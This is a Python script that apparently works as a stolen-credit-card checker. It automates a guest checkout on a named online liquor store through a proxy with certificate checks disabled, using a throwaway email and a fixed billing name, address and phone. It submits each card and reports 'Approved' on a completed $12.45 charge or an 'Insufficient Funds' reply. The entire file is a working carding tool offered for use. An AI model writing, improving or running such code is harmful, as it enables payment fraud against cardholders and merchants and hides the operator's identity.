import uuid
from httpx import AsyncClient

async def payflowccn1(cc,mes,ano,cvv,proxyg):
        async with AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as web:
            email = str(uuid.uuid4())[:8]+"@gmail.com"
            if len(ano) == 2:
                ano = "20" + ano
            if len(mes) == 1:
                mes = "0" + mes
            bin = cc[:6]
            type_card = "1"
            if cc[0] == "5":
                type_card = "2"
            if cc[0] == "3":
                type_card = "8"
            if cc[0] == "6":
                type_card = "9"
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                # 'cookie': 'PHPSESSID=i86bokpep0ravv2t294aqeot97; SC_Cart_ID=1733860749i7O71VWSbVxt8rf4GaDv; SC_referer=https%3A%2F%2Fwww.drinker.com%2Fstore.php; SC_referral_date=2024-12-10+13%3A59%3A09; devicePixelRatio=1',
                'origin': 'https://www.drinker.com',
                'pragma': 'no-cache',
                'priority': 'u=0, i',
                'referer': 'https://www.drinker.com/store.php?crn=2',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            }

            data = {
                'add_to_cart': '1',
                'discount_price': '',
                'discounted_qty': '',
                'discounted_qty_in_cart': '',
                'prod_rn': '404',
                'microtime': '0.02011100 1733860819',
                'edit_item': '',
                'option_count': '1',
                'b_price': '12.45',
                'option_0': '1',
                'quantity': '1',
            }

            req1 = await web.post('https://www.drinker.com/store.php?add404', headers=headers, data=data)
            with open("pae.html", "w") as file:
                file.write(req1.text)
            data = {
                'microtime': '0.19945800 1733860847',
                'update_quantity[cfd07f4f45ff17aea9df6f5271513ea2]': '1',
                'co[step][next]': 'next',
            }

            req2 = await web.post('https://www.drinker.com/store.php?co[step]=next', headers=headers, data=data)
            token = req2.text.split('type="hidden" name="token" value="')[1].split('"')[0]
            print(token)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                # 'cookie': 'PHPSESSID=i86bokpep0ravv2t294aqeot97; SC_Cart_ID=1733860749i7O71VWSbVxt8rf4GaDv; SC_referer=https%3A%2F%2Fwww.drinker.com%2Fstore.php; SC_referral_date=2024-12-10+13%3A59%3A09; devicePixelRatio=1',
                'origin': 'https://www.drinker.com',
                'pragma': 'no-cache',
                'priority': 'u=0, i',
                'referer': 'https://www.drinker.com/store.php?co[step]=next',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            }

            data = {
                'acct_choice[do]': 'login',
                'token': token,
                'co[step]': 'address',
                'acct_choice[login][user]': '',
                'acct_choice[login][pass]': '',
                'acct_choice[skip_email]': email,
                'acct_choice[skip_submit]': 'Continue as Guest',
            }

            req3 = await web.post('https://www.drinker.com/store.php', headers=headers, data=data)


            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                # 'cookie': 'PHPSESSID=i86bokpep0ravv2t294aqeot97; SC_Cart_ID=1733860749i7O71VWSbVxt8rf4GaDv; SC_referer=https%3A%2F%2Fwww.drinker.com%2Fstore.php; SC_referral_date=2024-12-10+13%3A59%3A09; devicePixelRatio=1',
                'origin': 'https://www.drinker.com',
                'pragma': 'no-cache',
                'priority': 'u=0, i',
                'referer': 'https://www.drinker.com/store.php?acct_choice[do]=skip&co[step]=address',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            }

            data = {
                'acct_choice[do]': 'skip',
                'co[step]': 'address',
                'address[Bill_First_Name]': 'Sebastian',
                'address[Bill_Last_Name]': 'Gutierrez',
                'address[Bill_Street]': '103-105 Central Avenue',
                'address[Bill_Street_2]': '',
                'address[Bill_City]': 'Orange',
                'address[Bill_Country]': '180',
                'address[Bill_State_or_Province]': '33',
                'address[Bill_Postal_Code]': '07050-3824',
                'address[Bill_State_Other]': '',
                'address[Bill_Company]': 'Hunter',
                'address[Bill_Email_Address]': email,
                'address[Bill_Phone]': '5059947000',
                'address[Bill_Fax]': '',
                'address[Ship_First_Name]': 'Sebastian',
                'address[Ship_Last_Name]': 'Gutierrez',
                'address[Ship_Company]': 'Hunter',
                'address[Ship_Street]': '103-105 Central Avenue',
                'address[Ship_Street_2]': '',
                'address[Ship_City]': 'Orange',
                'address[Ship_Country]': '180',
                'address[Ship_State_or_Province]': '33',
                'address[Ship_Postal_Code]': '07050-3824',
                'address[Ship_State_Other]': '',
                'address[Ship_Email_Address]': email,
                'address[Ship_Phone]': '5059947000',
                'address[Ship_Fax]': '',
                'address[Ship_Special_Instructions]': '',
            }

            req4 = await web.post('https://www.drinker.com/store.php', headers=headers, data=data)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                # 'cookie': 'PHPSESSID=i86bokpep0ravv2t294aqeot97; SC_Cart_ID=1733860749i7O71VWSbVxt8rf4GaDv; SC_referer=https%3A%2F%2Fwww.drinker.com%2Fstore.php; SC_referral_date=2024-12-10+13%3A59%3A09; devicePixelRatio=1',
                'origin': 'https://www.drinker.com',
                'pragma': 'no-cache',
                'priority': 'u=0, i',
                'referer': 'https://www.drinker.com/store.php',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            }
            print(type_card)
            data = {
                'co[step]': 'pay',
                'token': token,
                'pay[method]': type_card, 
                'pay[card_number]': cc,
                'pay[exp_month]': mes,
                'pay[exp_year]': ano,
                'pay[name_on_card]': 'Sebastian Gutierrez',
            }

            req5 = await web.post('https://www.drinker.com/store.php', headers=headers, data=data)
            if "Thanks for your order! Please print this page for your records" in req5.text:
                status = "Approved ✅"
                mensaje = "Charged $12.45"
            else:
                mensaje = req5.text.split('<div class="sc_msg error ">')[1].split('</div>')[0].strip().split('returned error code ')[1]
                if "Insufficient Funds" in mensaje:
                    status = "Approved ✅"
                else:
                    status = "Declined ❌"
            return status, mensaje